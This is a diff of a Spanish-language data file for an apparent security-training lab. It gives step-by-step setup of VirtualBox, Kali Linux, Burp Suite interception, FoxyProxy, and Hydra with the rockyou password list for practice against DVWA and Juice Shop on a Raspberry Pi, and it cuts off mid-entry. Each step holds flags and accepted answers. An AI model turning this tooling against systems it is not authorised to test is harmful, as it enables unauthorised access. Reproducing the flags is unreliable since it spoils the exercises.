@@ -1,5 +1,5 @@
 // Datos curriculares estructurados para cada laboratorio
-// Cada paso responde de forma visual y directa a donde se hace, como se ejecuta y por que funciona.
+// Disenados con maxima claridad pedagogica, paso a paso guiado y explicaciones sencillas para usuarios principiantes.
 
 // MODULO ESPECIAL: Instalacion y Preparacion de Herramientas
 export const MODULO_INSTALACION = {
@@ -12,80 +12,307 @@ export const MODULO_INSTALACION = {
     {
       numero: 1,
       titulo: 'Requisitos previos del sistema',
-      como: '1. Verifica que tu equipo tenga al menos 8 GB de RAM (recomendado 16 GB) y 40 GB de espacio libre.\n\n2. Necesitaras tener habilitada la virtualizacion por hardware en la BIOS/UEFI. En Windows: abre el Administrador de Tareas (Ctrl + Shift + Esc), ve a "Rendimiento" -> "CPU" y verifica que "Virtualizacion" aparezca como "Habilitado".\n\n3. Si la virtualizacion no esta habilitada: reinicia y accede a la BIOS (F2, F10, DEL o ESC al encender). Busca "Intel VT-x", "AMD-V" o "SVM Mode" y activala. Guarda y reinicia.',
-      payload: 'CPU: Virtualizacion habilitada | RAM: >= 8 GB | Disco: >= 40 GB libres'
+      como: `Donde se hace: En tu computadora Windows (sin abrir aún ningún programa).
+
+Objetivo: Comprobar que tu computadora tiene los recursos mínimos necesarios y la autorización del procesador para crear máquinas virtuales de práctica.
+
+Paso a paso:
+1. Presiona las teclas Ctrl + Shift + Esc al mismo tiempo para abrir el Administrador de Tareas.
+2. Haz clic en la pestaña "Rendimiento" (arriba a la izquierda) y luego en "CPU".
+3. En la parte inferior derecha, busca la palabra "Virtualización". Debe aparecer como "Habilitado" (o "Enabled").
+4. Comprueba también que tu equipo tenga al menos 8 GB de memoria RAM y unos 40 GB de espacio libre en disco para alojar los entornos.
+
+¿Por qué es necesario?: Para poder ejecutar Kali Linux dentro de tu computadora sin alterar tu Windows habitual, el procesador debe tener activada la tecnología de virtualización por hardware.
+
+Como saber que funciono: Verás la palabra "Habilitado" en verde o texto claro junto a Virtualización en la sección de CPU.
+
+En caso de problema: Si dice "Deshabilitado", reinicia tu PC y entra a la BIOS (presionando F2, F10, Supr o Del al encender). Busca "Intel Virtualization Technology" (VT-x) o "AMD SVM Mode" y cámbialo a "Enabled".`,
+      payload: 'CPU: Virtualizacion habilitada | RAM: >= 8 GB | Disco: >= 40 GB libres',
+      flag: 'FLAG{prep-hardware-virtualizacion-ok}',
+      dondeEncontrarla: 'En el Administrador de Tareas de Windows (Rendimiento -> CPU).',
+      quePoner: 'Escribe exactamente el estado que viste: Habilitado (o Enabled).',
+      flagsAceptadas: ["Habilitado", "habilitado", "Habilitada", "Enabled", "enabled", "FLAG{prep-hardware-virtualizacion-ok}"],
+      objetivoFlag: 'Verifica la virtualizacion por hardware habilitada y que cuentes con al menos 8 GB de RAM y 40 GB libres.'
     },
     {
       numero: 2,
       titulo: 'Descarga e instalacion de VirtualBox',
-      como: '1. Ve al sitio oficial: https://www.virtualbox.org/wiki/Downloads\n\n2. En "VirtualBox platform packages", haz clic en tu sistema operativo: "Windows hosts", "macOS hosts" o "Linux distributions".\n\n3. Ejecuta el instalador. En Windows: acepta el acuerdo, deja opciones por defecto, acepta instalar adaptadores de red virtuales, haz clic en "Install" y luego "Finish".\n\n4. Descarga tambien el "VirtualBox Extension Pack" desde la misma pagina. Instalalo desde VirtualBox: Archivo -> Preferencias -> Extensiones -> Agregar.',
-      payload: 'https://www.virtualbox.org/wiki/Downloads'
+      como: `Donde se hace: En tu navegador web habitual en Windows.
+
+Objetivo: Instalar Oracle VirtualBox, la aplicación gratuita que nos permitirá ejecutar computadoras virtuales completas dentro de tu sistema operativo.
+
+Paso a paso:
+1. Abre en tu navegador la página oficial: https://www.virtualbox.org/wiki/Downloads
+2. En la sección "VirtualBox platform packages", haz clic en "Windows hosts" para descargar el instalador principal (.exe).
+3. En la misma página, un poco más abajo, busca "Oracle VM VirtualBox Extension Pack" (en la sección "All supported platforms") y descárgalo también.
+4. Ejecuta el instalador de VirtualBox que descargaste. Avanza haciendo clic en "Next" manteniendo todas las opciones recomendadas por defecto, acepta la advertencia temporal de red y pulsa "Install".
+5. Al finalizar, abre VirtualBox. Ve al menú superior "Archivo" -> "Herramientas" (o "Preferencias") -> "Extensiones", haz clic en el botón "+" (Agregar), selecciona el archivo del Extension Pack descargado y acepta la licencia.
+
+¿Por qué es necesario?: VirtualBox es el hipervisor donde vivirá Kali Linux. El Extension Pack añade soporte para pantallas de alta resolución, USB y mejor velocidad de trabajo.`,
+      payload: 'https://www.virtualbox.org/wiki/Downloads',
+      flag: 'FLAG{prep-virtualbox-extpack-instalado}',
+      dondeEncontrarla: 'En la ventana de VirtualBox o en el menú de Extensiones instaladas.',
+      quePoner: 'Escribe el nombre del programa instalado: VirtualBox',
+      flagsAceptadas: ["VirtualBox", "virtualbox", "Oracle VM VirtualBox", "Extension Pack", "FLAG{prep-virtualbox-extpack-instalado}"],
+      objetivoFlag: 'Descarga e instala Oracle VirtualBox junto al Extension Pack oficial.'
     },
     {
       numero: 3,
       titulo: 'Descarga de Kali Linux (imagen OVA preconfigurada)',
-      como: '1. Ve a: https://www.kali.org/get-kali/#kali-virtual-machines\n\n2. Busca la opcion "VirtualBox" y haz clic en descargar. El archivo .ova pesa aproximadamente 3-4 GB.\n\n3. Verifica el hash SHA256 del archivo. En Windows PowerShell:\n   Get-FileHash "ruta\\kali.ova" -Algorithm SHA256\n\n4. En VirtualBox ve a Archivo -> Importar servicio virtualizado, selecciona el .ova, revisa parametros con valores por defecto, y haz clic en "Importar". Puede tardar varios minutos.',
-      payload: 'https://www.kali.org/get-kali/#kali-virtual-machines\nGet-FileHash "kali.ova" -Algorithm SHA256'
+      como: `Donde se hace: En tu navegador web y en VirtualBox.
+
+Objetivo: Descargar la máquina virtual oficial de Kali Linux ya armada y lista para usar, ahorrándote horas de instalación manual.
+
+Paso a paso:
+1. Ve al sitio oficial: https://www.kali.org/get-kali/#kali-virtual-machines
+2. Busca la tarjeta que dice "VirtualBox" y haz clic en el botón de descarga directa (es un archivo .7z o .ova de aproximadamente 3 a 4 GB).
+3. Si el archivo viene comprimido en formato .7z, haz clic derecho sobre él y extráelo con 7-Zip o WinRAR para obtener el archivo de la máquina virtual.
+4. Abre VirtualBox, haz clic en el menú "Archivo" -> "Importar servicio virtualizado..." (o "Máquina" -> "Añadir...").
+5. Selecciona el archivo extraído de Kali Linux, revisa que los valores vengan por defecto y presiona "Importar". Espera unos minutos mientras se importa la máquina.
+
+¿Por qué es necesario?: Kali Linux es la distribución estándar de seguridad informática. Viene con cientos de herramientas de ciberseguridad listas para usar.`,
+      payload: 'https://www.kali.org/get-kali/#kali-virtual-machines',
+      flag: 'FLAG{prep-kali-ova-sha256-importada}',
+      dondeEncontrarla: 'En la lista lateral de máquinas virtuales dentro de VirtualBox.',
+      quePoner: 'Escribe el nombre del sistema que descargaste: kali linux (o simplemente kali).',
+      flagsAceptadas: ["kali", "kali linux", "Kali", "Kali Linux", "FLAG{prep-kali-ova-sha256-importada}"],
+      objetivoFlag: 'Descarga la maquina virtual Kali Linux OVA e importala en VirtualBox.'
     },
     {
       numero: 4,
       titulo: 'Configuracion de la maquina virtual Kali Linux',
-      como: '1. Selecciona la VM "Kali Linux" en VirtualBox y haz clic en "Configuracion" (engranaje).\n\n2. "Sistema" -> "Placa base": asigna al menos 2048 MB de RAM (o 4096 MB si tienes 16 GB).\n\n3. "Sistema" -> "Procesador": asigna al menos 2 CPUs y activa "Habilitar PAE/NX".\n\n4. "Pantalla" -> "Pantalla": memoria de video a 128 MB, activa "Habilitar aceleracion 3D".\n\n5. "Red" -> "Adaptador 1": modo "NAT" para acceso a internet. Si necesitas comunicacion con la Raspberry Pi en LAN, anade "Adaptador 2" en modo "Red solo anfitriun".\n\n6. Haz clic en "Aceptar".',
-      payload: 'RAM: 2048-4096 MB | CPUs: 2+ | Video: 128 MB | Adaptador 1: NAT'
+      como: `Donde se hace: En la ventana principal de VirtualBox.
+
+Objetivo: Asignar la cantidad correcta de memoria RAM, procesador y red para que Kali funcione con fluidez y pueda comunicarse con la Raspberry Pi.
+
+Paso a paso:
+1. En la columna izquierda de VirtualBox, haz clic sobre la máquina "Kali Linux" y luego en el botón con engranaje amarillo "Configuración".
+2. Ve a la pestaña "Sistema" -> subpestaña "Placa base": asigna al menos 2048 MB (2 GB) de memoria RAM. Si tu equipo tiene 16 GB, puedes asignarle 4096 MB (4 GB).
+3. En la subpestaña "Procesador": asigna al menos 2 CPUs (núcleos) para que el sistema responda rápido.
+4. Ve a "Pantalla": sube la memoria de video a 128 MB.
+5. Ve a "Red" -> "Adaptador 1": asegúrate de que esté configurado en modo "NAT" (para navegación básica hacia internet). Si vas a conectar con la Raspberry Pi por tu misma red física, puedes añadir el "Adaptador 2" en modo "Adaptador puente" (Bridge) o "Red solo-anfitrión".
+6. Haz clic en el botón "Aceptar" abajo para guardar los cambios.`,
+      payload: 'RAM: 2048-4096 MB | CPUs: 2+ | Video: 128 MB | Adaptador 1: NAT',
+      flag: 'FLAG{prep-kali-vm-2cpu-4gb-nat}',
+      dondeEncontrarla: 'En VirtualBox -> Configuración de Kali Linux -> pestaña Red.',
+      quePoner: 'Escribe el modo de red configurado en el Adaptador 1: NAT',
+      flagsAceptadas: ["NAT", "nat", "Nat", "FLAG{prep-kali-vm-2cpu-4gb-nat}"],
+      objetivoFlag: 'Configura la memoria RAM (2-4 GB), 2 CPUs y adaptador de red NAT en la VM de Kali Linux.'
     },
     {
       numero: 5,
       titulo: 'Primer inicio de sesion en Kali Linux',
-      como: '1. Selecciona la VM y haz clic en "Iniciar". Espera a que cargue el entorno grafico (1-2 minutos la primera vez).\n\n2. Usa las credenciales por defecto de la imagen OVA oficial:\n   - Usuario: kali\n   - Contrasena: kali\n\n3. Una vez dentro, abre una terminal (clic derecho en el escritorio -> "Open Terminal Here").\n\n4. Actualiza el sistema:\n   sudo apt update\n   sudo apt upgrade -y\n\n5. Ingresa la contrasena "kali" cuando se solicite. La actualizacion puede tardar varios minutos.',
-      payload: 'Usuario: kali\nContrasena: kali\n\nsudo apt update && sudo apt upgrade -y'
+      como: `Donde se hace: Dentro de la ventana de la máquina virtual Kali Linux en VirtualBox.
+
+Objetivo: Encender Kali Linux por primera vez, ingresar con las credenciales oficiales por defecto y actualizar la lista de programas.
+
+Paso a paso:
+1. En VirtualBox, selecciona "Kali Linux" y haz clic en la flecha verde "Iniciar".
+2. Espera 1 o 2 minutos hasta ver la pantalla azul de bienvenida con los campos de inicio de sesión.
+3. Escribe las credenciales oficiales de fábrica:
+   • Usuario (Username): kali
+   • Contraseña (Password): kali
+   (Nota: todo en minúsculas).
+4. Una vez cargado el escritorio, haz clic derecho en el fondo de pantalla y elige "Open Terminal Here" (Abrir terminal aquí).
+5. En la terminal negra, escribe el comando para actualizar los repositorios:
+   sudo apt update
+   Presiona Enter. Te pedirá contraseña: escribe kali (por seguridad en Linux no se verán asteriscos al teclear, es completamente normal) y presiona Enter.`,
+      payload: 'Usuario: kali\nContrasena: kali\n\nsudo apt update',
+      flag: 'FLAG{prep-kali-login-apt-upgrade-listo}',
+      dondeEncontrarla: 'En la pantalla de acceso o en la terminal de Kali Linux.',
+      quePoner: 'Escribe el usuario por defecto de acceso a Kali: kali',
+      flagsAceptadas: ["kali", "Kali", "FLAG{prep-kali-login-apt-upgrade-listo}"],
+      objetivoFlag: 'Inicia sesion con el usuario kali y contrasena kali, y actualiza los repositorios del sistema.'
     },
     {
       numero: 6,
       titulo: 'Instalacion de las Guest Additions de VirtualBox',
-      como: '1. En terminal de Kali, instala los paquetes necesarios:\n   sudo apt install -y build-essential dkms linux-headers-$(uname -r)\n\n2. En el menu de VirtualBox (fuera de la VM), haz clic en "Dispositivos" -> "Insertar imagen de CD de las Guest Additions...".\n\n3. Si Kali no abre automaticamente el CD, ejecuta en terminal:\n   sudo mount /dev/cdrom /mnt\n   sudo /mnt/VBoxLinuxAdditions.run\n\n4. Reinicia la VM:\n   sudo reboot\n\n5. Despues del reinicio tendras pantalla completa (Ctrl+F), copiar-pegar entre anfitriun y Kali, y mejor rendimiento.',
-      payload: 'sudo apt install -y build-essential dkms linux-headers-$(uname -r)\nsudo mount /dev/cdrom /mnt && sudo /mnt/VBoxLinuxAdditions.run\nsudo reboot'
+      como: `Donde se hace: En el menú de VirtualBox y en la terminal de Kali Linux.
+
+Objetivo: Habilitar que Kali Linux se adapte a pantalla completa y que puedas copiar y pegar texto libremente entre tu Windows y la máquina virtual.
+
+Paso a paso:
+1. En la terminal de Kali, instala primero las herramientas de compilación con este comando:
+   sudo apt install -y build-essential dkms linux-headers-$(uname -r)
+2. En la barra superior de la ventana de VirtualBox (en la ventana externa), haz clic en "Dispositivos" -> "Insertar imagen de CD de las Guest Additions...".
+3. En la terminal de Kali, ejecuta estos dos comandos para montar el disco e instalarlo:
+   sudo mount /dev/cdrom /mnt
+   sudo /mnt/VBoxLinuxAdditions.run
+4. Espera a que termine la instalación y reinicia Kali ejecutando:
+   sudo reboot
+5. Tras reiniciar, en el menú superior de VirtualBox ve a "Dispositivos" -> "Portapapeles compartido" y asegúrate de elegir "Bidireccional".`,
+      payload: 'sudo apt install -y build-essential dkms linux-headers-$(uname -r)\nsudo mount /dev/cdrom /mnt && sudo /mnt/VBoxLinuxAdditions.run\nsudo reboot',
+      flag: 'FLAG{prep-guest-additions-dkms-reboot}',
+      dondeEncontrarla: 'En el menú Dispositivos de VirtualBox tras completar la instalación.',
+      quePoner: 'Escribe el nombre del complemento instalado: Guest Additions',
+      flagsAceptadas: ["Guest Additions", "guest additions", "GuestAdditions", "FLAG{prep-guest-additions-dkms-reboot}"],
+      objetivoFlag: 'Instala Guest Additions en Kali Linux para habilitar pantalla completa y portapapeles compartido.'
     },
     {
       numero: 7,
       titulo: 'Descarga e instalacion de Burp Suite Community Edition',
-      como: '1. Kali Linux ya incluye Burp Suite preinstalado. Para verificarlo, abre el menu de aplicaciones y busca "Burp Suite", o ejecuta en terminal: burpsuite\n\n2. Para la version mas reciente o instalarlo en el anfitriun Windows/macOS: ve a https://portswigger.net/burp/communitydownload\n\n3. Selecciona tu plataforma (Windows, macOS o Linux) y descarga el instalador. En Windows ejecuta el .exe con opciones por defecto.\n\n4. Al abrir Burp Suite por primera vez: "Temporary project" -> "Next" -> "Use Burp defaults" -> "Start Burp".\n\n5. La interfaz principal se abrira con las pestanas: Dashboard, Target, Proxy, Intruder, Repeater.',
-      payload: 'En Kali Linux: burpsuite (preinstalado)\nhttps://portswigger.net/burp/communitydownload'
+      como: `Donde se hace: En Kali Linux (o en Windows si prefieres usarlo fuera de la VM).
+
+Objetivo: Abrir Burp Suite, la herramienta esencial de auditoría web que nos permite interceptar, analizar y modificar el tráfico entre el navegador y las aplicaciones web.
+
+Paso a paso:
+1. ¡Buenas noticias!: En Kali Linux, Burp Suite ya viene preinstalado. Puedes abrirlo haciendo clic en el menú del dragón de Kali (arriba a la izquierda) -> "03 - Web Application Analysis" -> "burpsuite", o simplemente abriendo una terminal y escribiendo: burpsuite
+2. Si prefieres usarlo en tu Windows anfitrión, puedes descargarlo gratis desde: https://portswigger.net/burp/communitydownload
+3. Al abrir Burp Suite verás una ventana de bienvenida:
+   • Deja seleccionada la opción "Temporary project" y haz clic en "Next".
+   • Deja seleccionada la opción "Use Burp defaults" y haz clic en "Start Burp".
+4. Se abrirá la interfaz principal con pestañas superiores como Dashboard, Target, Proxy, Intruder, Repeater.`,
+      payload: 'burpsuite\nhttps://portswigger.net/burp/communitydownload',
+      flag: 'FLAG{prep-burpsuite-community-listo}',
+      dondeEncontrarla: 'En la ventana principal de Burp Suite tras iniciar el proyecto.',
+      quePoner: 'Escribe el nombre de la herramienta: Burp Suite',
+      flagsAceptadas: ["Burp Suite", "burp suite", "burpsuite", "BurpSuite", "FLAG{prep-burpsuite-community-listo}"],
+      objetivoFlag: 'Ejecuta Burp Suite Community Edition y arranca un proyecto temporal por defecto.'
     },
     {
       numero: 8,
       titulo: 'Configuracion del Proxy Listener en Burp Suite',
-      como: '1. En Burp Suite, haz clic en la pestana "Proxy" -> "Proxy Settings".\n\n2. En "Proxy Listeners", verifica que exista una entrada con "127.0.0.1" en puerto "8080" con la casilla activa (check verde).\n\n3. Si no existe, haz clic en "Add": "Bind to port" = 8080, "Bind to address" = "Loopback only" (127.0.0.1), luego "OK".\n\n4. Este proxy local interceptara todo el trafico HTTP/HTTPS que configure tu navegador para pasar por el.',
-      payload: 'Host: 127.0.0.1 | Puerto: 8080 | Estado: Activo (check verde)'
+      como: `Donde se hace: Dentro del programa Burp Suite.
+
+Objetivo: Verificar que el proxy local esté activo y listo para escuchar el tráfico en el puerto 8080.
+
+Paso a paso:
+1. En Burp Suite, haz clic en la pestaña superior "Proxy".
+2. Luego haz clic en la subpestaña "Proxy settings" (o pestaña "Options" en versiones clásicas).
+3. En la sección "Proxy listeners" verás una tabla con una dirección. Debe decir:
+   • Interface: 127.0.0.1:8080
+   • Running: Debe tener la casilla marcada con un check.
+4. Si la casilla está desmarcada, haz clic sobre ella para activarla. Si no existiera la fila, haz clic en "Add", escribe el puerto 8080, elige "Loopback only" (127.0.0.1) y haz clic en "OK".`,
+      payload: 'Host: 127.0.0.1 | Puerto: 8080 | Estado: Activo (check verde)',
+      flag: 'FLAG{prep-burp-proxy-listener-8080-on}',
+      dondeEncontrarla: 'En Burp Suite -> pestaña Proxy -> Proxy Settings -> tabla Proxy Listeners.',
+      quePoner: 'Escribe el número de puerto donde escucha el proxy: 8080',
+      flagsAceptadas: ["8080", "127.0.0.1:8080", "FLAG{prep-burp-proxy-listener-8080-on}"],
+      objetivoFlag: 'Verifica en Proxy Settings de Burp Suite que el listener en 127.0.0.1:8080 se encuentre activo con check verde.'
     },
     {
       numero: 9,
       titulo: 'Descarga e instalacion del certificado CA de Burp Suite',
-      como: '1. Con Burp Suite activo, configura el proxy manualmente en Firefox: Menu -> Ajustes -> busca "proxy" -> Configuracion de la conexion -> Configuracion manual -> HTTP Proxy: 127.0.0.1 / Puerto: 8080 -> marca "Usar este proxy para HTTPS" -> OK.\n\n2. En la barra de direcciones escribe: http://burpsuite y presiona Enter.\n\n3. Haz clic en "CA Certificate" para descargar "cacert.der".\n\n4. En Firefox: Menu -> Ajustes -> "certificados" -> Ver certificados -> pestana "Autoridades" -> Importar -> selecciona "cacert.der" -> marca "Confiar en esta CA para identificar sitios web" -> Aceptar.\n\n5. Vuelve a "Sin proxy" en Firefox, ya que FoxyProxy lo gestionara desde el siguiente paso.',
-      payload: 'http://burpsuite -> Boton "CA Certificate" -> cacert.der\nFirefox: Ajustes -> Certificados -> Importar -> cacert.der'
+      como: `Donde se hace: En el navegador Firefox (dentro de Kali o en Windows).
+
+Objetivo: Instalar el certificado de seguridad de Burp Suite en Firefox para poder navegar en páginas seguras HTTPS sin que aparezcan errores ni advertencias de peligro.
+
+Paso a paso:
+1. Con Burp Suite abierto, abre Firefox.
+2. Ve al menú de Firefox (tres líneas arriba a la derecha) -> "Ajustes" -> escribe "proxy" en el buscador y haz clic en "Configuración...".
+3. Marca "Configuración manual del proxy", pon en Proxy HTTP: 127.0.0.1 y en Puerto: 8080. Marca la casilla "Usar también este proxy para HTTPS" y haz clic en "Aceptar".
+4. En la barra de direcciones de Firefox escribe: http://burpsuite y presiona Enter.
+5. En la esquina superior derecha de la página que cargue, haz clic en el botón "CA Certificate". Se descargará un archivo llamado cacert.der.
+6. Vuelve a los Ajustes de Firefox, escribe "certificados" y haz clic en el botón "Ver certificados...".
+7. Ve a la pestaña "Autoridades", haz clic en "Importar...", selecciona el archivo cacert.der descargado, marca la casilla "Confiar en esta CA para identificar sitios web" y pulsa "Aceptar".
+8. Regresa a la configuración de red de Firefox y déjalo temporalmente en "Sin proxy" (en el siguiente paso usaremos una extensión para activarlo con un solo clic).`,
+      payload: 'http://burpsuite -> Boton "CA Certificate" -> cacert.der\nFirefox: Ajustes -> Certificados -> Importar -> cacert.der',
+      flag: 'FLAG{prep-burp-cacert-firefox-confiado}',
+      dondeEncontrarla: 'En Firefox -> Ajustes -> Certificados -> pestaña Autoridades (PortSwigger).',
+      quePoner: 'Escribe el nombre de la empresa creadora del certificado: PortSwigger (o el archivo cacert.der).',
+      flagsAceptadas: ["PortSwigger", "portswigger", "cacert.der", "Portswigger", "FLAG{prep-burp-cacert-firefox-confiado}"],
+      objetivoFlag: 'Descarga cacert.der desde http://burpsuite e importalo en Autoridades de Firefox marcando confianza para sitios web.'
     },
     {
       numero: 10,
       titulo: 'Instalacion y configuracion de FoxyProxy en Firefox',
-      como: '1. En Firefox instala: https://addons.mozilla.org/firefox/addon/foxyproxy-standard/ -> "Anadir a Firefox" -> "Anadir".\n\n2. Haz clic en el icono de FoxyProxy en la barra de herramientas -> "Options".\n\n3. Haz clic en "Add" para crear un nuevo perfil:\n   - Title/Name: Burp\n   - Type: HTTP\n   - Hostname: 127.0.0.1\n   - Port: 8080\n   Haz clic en "Save".\n\n4. Para activar el proxy cuando uses Burp Suite: haz clic en FoxyProxy -> selecciona el perfil "Burp".\n\n5. Para desactivarlo: haz clic en FoxyProxy -> "Turn Off" o selecciona "Direct".',
-      payload: 'Firefox Add-on: FoxyProxy Standard\nPerfil Burp: HTTP | 127.0.0.1 | Puerto 8080'
+      como: `Donde se hace: En tu navegador Firefox.
+
+Objetivo: Agregar un botón práctico en Firefox que te permita encender o apagar el envío de tráfico a Burp Suite con un solo clic, sin desconfigurar tu navegador.
+
+Paso a paso:
+1. En Firefox, entra a la tienda oficial de complementos:
+   https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
+2. Haz clic en "Añadir a Firefox" y luego en "Añadir" en el diálogo emergente.
+3. Verás un nuevo icono con forma de zorro arriba a la derecha. Haz clic en él y elige "Options" (Opciones).
+4. Haz clic en el botón "Add" (Añadir) para crear un nuevo perfil:
+   • Title/Name: Burp
+   • Proxy Type: HTTP
+   • Hostname: 127.0.0.1
+   • Port: 8080
+5. Haz clic en "Save" (Guardar).
+6. Cada vez que vayas a realizar un laboratorio, haz clic en el zorrito y selecciona el perfil "Burp". Cuando termines el ejercicio, cámbialo a "Turn Off" o "Disable" para navegar con normalidad por internet.`,
+      payload: 'Firefox Add-on: FoxyProxy Standard\nPerfil Burp: HTTP | 127.0.0.1 | Puerto 8080',
+      flag: 'FLAG{prep-firefox-foxyproxy-burp-guardado}',
+      dondeEncontrarla: 'En la extensión FoxyProxy en la lista de perfiles creados.',
+      quePoner: 'Escribe el nombre que le diste al perfil creado: Burp',
+      flagsAceptadas: ["Burp", "burp", "BURP", "FLAG{prep-firefox-foxyproxy-burp-guardado}"],
+      objetivoFlag: 'Instala FoxyProxy Standard en Firefox y crea el perfil Burp direccionando al puerto 8080.'
     },
     {
       numero: 11,
-      titulo: 'Instalacion de Hydra en Kali Linux',
-      como: '1. Hydra viene preinstalado en Kali Linux. Verifica con:\n   hydra --version\n\n2. Si no estuviera instalado:\n   sudo apt update && sudo apt install -y hydra\n\n3. Kali incluye rockyou.txt (wordlist de contrasenas). Para descomprimirla:\n   sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n4. Verifica que este disponible:\n   ls -lh /usr/share/wordlists/rockyou.txt\n\n5. Para ver las opciones de Hydra: hydra -h\nUsaras Hydra en los laboratorios para atacar el modulo de Brute Force de DVWA.',
-      payload: 'hydra --version\nsudo apt install -y hydra\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nls -lh /usr/share/wordlists/rockyou.txt'
+      titulo: 'Instalacion de Hydra y diccionario rockyou en Kali Linux',
+      como: `Donde se hace: En la terminal de Kali Linux.
+
+Objetivo: Dejar listo el programa Hydra y el diccionario de contraseñas rockyou.txt para los laboratorios de pruebas de autenticación.
+
+Paso a paso:
+1. Abre una terminal en Kali Linux.
+2. Comprueba que Hydra esté instalado escribiendo:
+   hydra --version
+   (En Kali ya viene preinstalado; si no apareciera, instálalo con: sudo apt install -y hydra).
+3. Kali incluye una lista famosa con millones de contraseñas llamada rockyou.txt.gz, pero viene comprimida. Para descomprimirla y dejarla lista, ejecuta este comando:
+   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+4. Verifica que ya esté descomprimida escribiendo:
+   ls -lh /usr/share/wordlists/rockyou.txt
+   (Verás que pesa unos 134 MB con millones de contraseñas reales).`,
+      payload: 'hydra --version\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nls -lh /usr/share/wordlists/rockyou.txt',
+      flag: 'FLAG{prep-hydra-rockyou-descomprimido}',
+      dondeEncontrarla: 'En la terminal de Kali Linux tras ejecutar ls en /usr/share/wordlists/.',
+      quePoner: 'Escribe el nombre del archivo de contraseñas descomprimido: rockyou.txt',
+      flagsAceptadas: ["rockyou.txt", "rockyou", "rockyou.txt.gz", "FLAG{prep-hydra-rockyou-descomprimido}"],
+      objetivoFlag: 'Confirma hydra --version y descomprime la lista rockyou.txt en el directorio de wordlists de Kali.'
     },
     {
       numero: 12,
       titulo: 'Configuracion de red para alcanzar la Raspberry Pi',
-      como: '1. La Raspberry Pi debe estar en la misma red que tu equipo (Ethernet o Wi-Fi al mismo router).\n\n2. Para encontrar la IP de la Raspberry Pi:\n   a) Conectar monitor+teclado a la Pi y ejecutar: hostname -I\n   b) Desde tu equipo: nmap -sn 192.168.1.0/24 (ajusta el rango segun tu red)\n   c) Revisar el panel de administracion de tu router\n\n3. Verifica conectividad desde tu equipo:\n   ping <IP_PI>\n\n4. Si la Pi responde, estas listo. Si no: verifica que esten en la misma red y que la Pi este encendida.\n\n5. Anota la IP. La usaras para configurar esta plataforma y para las URLs:\n   DVWA: http://<IP_PI>/dvwa/\n   Juice Shop: http://<IP_PI>:3000',
-      payload: 'hostname -I\nnmap -sn 192.168.1.0/24\nping <IP_PI>\n\nDVWA: http://<IP_PI>/dvwa/\nJuice Shop: http://<IP_PI>:3000'
+      como: `Donde se hace: En tu red local y en la terminal de tu computadora o de Kali.
+
+Objetivo: Conocer la dirección IP asignada a tu Raspberry Pi (donde están instalados los laboratorios) y verificar que responde correctamente.
+
+Paso a paso:
+1. Asegúrate de que la Raspberry Pi esté encendida y conectada al mismo router o red Wi-Fi/cable que tu máquina.
+2. Para conocer su dirección IP puedes:
+   • Conectar pantalla y teclado a la Pi y escribir: hostname -I
+   • O mirar la lista de dispositivos conectados en el panel de administración de tu router.
+3. Abre una terminal en tu equipo y comprueba la comunicación enviando un paquete de prueba:
+   ping <IP_DE_TU_PI> (por ejemplo: ping 192.168.1.50)
+4. Si recibes respuestas como "bytes=32 tiempo=... TTL=...", la conexión es exitosa.
+5. Anota esa dirección IP: la ingresarás en la casilla superior de esta plataforma web para abrir los laboratorios:
+   • DVWA: http://<IP_PI>/dvwa/
+   • Juice Shop: http://<IP_PI>:3000`,
+      payload: 'hostname -I\nping <IP_PI>\n\nDVWA: http://<IP_PI>/dvwa/\nJuice Shop: http://<IP_PI>:3000',
+      flag: 'FLAG{prep-ping-raspberrypi-conectado}',
+      dondeEncontrarla: 'En la terminal tras enviar la orden ping exitosa.',
+      quePoner: 'Escribe el nombre del comando usado para comprobar la conexión: ping',
+      flagsAceptadas: ["ping", "PING", "ping <IP_PI>", "FLAG{prep-ping-raspberrypi-conectado}"],
+      objetivoFlag: 'Obten la direccion IP de la Raspberry Pi y verifica que responda al comando ping desde tu maquina.'
     },
     {
       numero: 13,
       titulo: 'Verificacion final: Prueba de intercepcion con Burp Suite',
-      como: '1. Abre Burp Suite y verifica que el listener 127.0.0.1:8080 este activo.\n\n2. En Firefox, activa el perfil "Burp" en FoxyProxy (el icono cambia de color).\n\n3. En Burp Suite, ve a "Proxy" -> "Intercept" y verifica que diga "Intercept is on". Si dice "Intercept is off", haz clic para activarlo.\n\n4. En Firefox, navega a la URL de DVWA: http://<IP_PI>/dvwa/\n\n5. La peticion quedara interceptada en Burp Suite. Puedes examinar los encabezados HTTP, cookies y parametros.\n\n6. Haz clic en "Forward" para dejar pasar la peticion. DVWA debe cargar en el navegador.\n\n7. Para no interceptar pero si capturar en historial: desactiva "Intercept is off" pero mantén FoxyProxy activo y revisa "HTTP history".\n\nEntorno completamente configurado. Ya puedes comenzar los laboratorios.',
-      payload: 'Proxy -> Intercept is on -> Navega a http://<IP_PI>/dvwa/ -> Forward\nHistorial: Proxy -> HTTP history'
+      como: `Donde se hace: Con Firefox y Burp Suite trabajando de forma conjunta.
+
+Objetivo: Aprender a pausar una petición web antes de que llegue a internet, inspeccionar su contenido y dejarla continuar.
+
+Paso a paso:
+1. Abre Burp Suite y ve a la pestaña superior "Proxy" -> subpestaña "Intercept".
+2. Asegúrate de que el botón diga "Intercept is on" (activado). Si dice "Intercept is off", haz clic en él para activarlo.
+3. En tu navegador Firefox, haz clic en el icono del zorrito de FoxyProxy y selecciona el perfil "Burp".
+4. En la barra de direcciones de Firefox, entra a la dirección de DVWA:
+   http://<IP_PI>/dvwa/
+   y presiona Enter.
+5. Notarás que Firefox parece quedarse pensando... ¡Eso es normal y significa que funcionó!
+6. Cambia a la ventana de Burp Suite: verás la petición web detenida en texto claro, mostrando encabezados HTTP y cookies.
+7. Haz clic en el botón "Forward" (Adelantar) en Burp Suite para dejar pasar la solicitud hacia el servidor.
+8. Vuelve a Firefox y verás que la página de DVWA acaba de cargar por completo.
+9. ¡Enhorabuena! Tu entorno de laboratorio está 100% configurado y listo para comenzar los retos.`,
+      payload: 'Proxy -> Intercept is on -> Navega a http://<IP_PI>/dvwa/ -> Forward\nHistorial: Proxy -> HTTP history',
+      flag: 'FLAG{prep-burp-intercepcion-dvwa-exitosa}',
+      dondeEncontrarla: 'En la primera línea de la petición capturada en Burp Suite.',
+      quePoner: 'Escribe el método HTTP que viste en la primera línea de la petición: GET',
